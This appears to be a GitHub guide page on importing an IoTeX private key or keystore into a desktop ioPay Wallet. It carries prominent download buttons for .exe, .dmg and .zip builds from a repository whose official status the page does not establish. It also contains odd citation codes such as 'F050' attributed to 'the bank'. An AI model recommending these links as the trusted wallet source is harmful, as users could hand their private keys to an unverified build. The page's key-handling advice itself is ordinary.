![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Importing an IoTeX Private Key Into ioPay Wallet

ioPay Wallet imports an account from **a phrase, a private key or a keystore file** (F018). This page is the key route - how to do it, and why the artifact you have matters more than the steps.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## Three artifacts, one account

People use these words interchangeably and then cannot restore anything:

- **Seed phrase** - 12 or 24 words that derive the account. The usual backup for wallets created in this build.
- **Private key** - a single key for one account, usually a long hex string.
- **Keystore file** - an encrypted key file, normally paired with a password.

They are **not** interchangeable (F050). A phrase cannot be entered as a key, a keystore without its password is a locked box, and a key cannot be turned back into a phrase. If the earlier desktop client created your account, it backed up by key or keystore - so that is what you import.

## Before you start

- **Handle the key like cash.** A raw private key is unencrypted. Do not paste it into a chat, a website, a note that syncs, or a screenshot.
- **Confirm you are on the current build** - v2.0.2, 19 November 2026.
- **Have somewhere to put the account name** you will use, so you can tell it apart later.

## The steps

1. **Open the wallet and choose import** rather than create.
2. **Choose private key** (or keystore, if that is what you have).
3. **Paste the key**, or open the keystore file and enter its password.
4. **Name the account.**
5. **Confirm both addresses** - the `io1...` native form and the `0x...` EVM form (F019). Compare them with wherever the account came from.
6. **Check balances and positions** before you send anything.

If the account shows zero and you expected a balance, check the address against the source before trying anything else. Import does not move funds; it opens an account that already exists.

## Keystore specifics

A keystore file is **encrypted with its own password** - not with your app PIN. Losing that password loses access to the file, and there is no reset. If you have the key and the keystore, prefer the key for recovery and treat the keystore as a second copy of the same secret.

## What import does not do

**It does not move funds.** The account is on-chain; the app is a second window onto it.

**It does not create a backup.** After importing, back up properly - the phrase if you have one, or a securely stored copy of the key material if that is all you have. [Backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).

**It does not merge accounts.** Importing a key adds one account. If your phrase-based account and a key-based account are different keys, they stay separate accounts.

## If it does not work

**"Invalid key" or nothing happens.** Check character count and for stray whitespace; keys are exact. If you copied from a document, copy again rather than retyping.

**The account restores but is empty.** It is a different key from the one you meant, or the funds are on a different account. Confirm the address rather than repeating the import.

**You have a keystore and no password.** There is no recovery. That is what the password was for.

## Related

- [Restoring from a phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/restoring-iopay-wallet-from-a-seed-phrase.md) - the phrase route, if you have one.
- [io1 and 0x addresses](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) - why one account shows two addresses.
- [Watch-only addresses](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/watch-only-addresses-in-iopay-wallet.md) - if you want to see an account without importing its key.

## FAQ

**How do I import an existing IoTeX private key?**
Choose import, select private key, paste it, name the account, and confirm both addresses match the source.

**Can I convert a private key into a seed phrase?**
No. Derivation runs one way: a phrase produces keys, not the reverse.

**Is importing a key safe?**
It is as safe as your handling of the key. Do it offline where possible, never paste a key into a website, and back up the result.

**Will importing overwrite my existing accounts?**
No. It adds an account.

**Do I need the keystore password if I have the key?**
No - but keep both. They are two representations of the same secret.

## Where the key came from decides the route

The artifact you hold is a record of which wallet created the account, and that is worth reading before you type anything. An account made in the current build usually has a phrase. An account made in the earlier desktop client is likelier to have a key or a keystore, because that client stopped generating phrases at one point (F050). An account made on the mobile app has a phrase, and importing the key instead works only if the phone actually showed you one.

If you have two of the three, use the one that is easiest to verify afterwards - the phrase, when it exists, because it proves itself by deriving the address you expect.

## Storing a key you had to import

If the key is all you have, it is now the whole backup, and it is unencrypted by nature. Two copies, both offline, in different places; a password manager is a reasonable third copy if you trust it, a synced note is not. Write down what the key belongs to - the address, and which wallet it came from - because a bare hex string in six months is a string, not a memory.

A keystore is the encrypted alternative: one file, one password, and the same rule that the password is not recoverable. If you are choosing how to store an account you cannot give a phrase to, the keystore plus a remembered password beats a raw key in a text file.


---

*Import paths follow the v2.0.2 build; the three artifacts follow the bank's F050 and IoTeX documentation.*
